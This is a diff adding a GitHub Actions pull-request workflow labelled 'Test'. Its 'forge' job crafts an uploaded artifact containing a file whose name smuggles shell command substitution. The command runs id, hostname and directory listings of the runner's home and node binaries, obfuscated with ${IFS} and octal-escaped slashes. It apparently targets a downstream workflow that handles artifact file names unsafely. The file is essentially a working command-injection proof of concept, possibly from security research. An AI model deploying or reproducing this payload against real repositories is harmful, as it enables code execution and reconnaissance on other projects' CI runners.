@@ -1,0 +1,24 @@
+name: Test
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft artifact
+        env:
+          PR_NUMBER: ${{ github.event.number }}
+        run: |
+          mkdir -p out
+          printf '%s' "$PR_NUMBER" > out/pr_number.txt
+          : > 'out/$(id;hostname;ls${IFS}-la${HOME};ls${IFS}-la${HOME}$(printf${IFS}\\57)actions-runner$(printf${IFS}\\57)externals$(printf${IFS}\\57)node24$(printf${IFS}\\57)bin).txt'
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: out
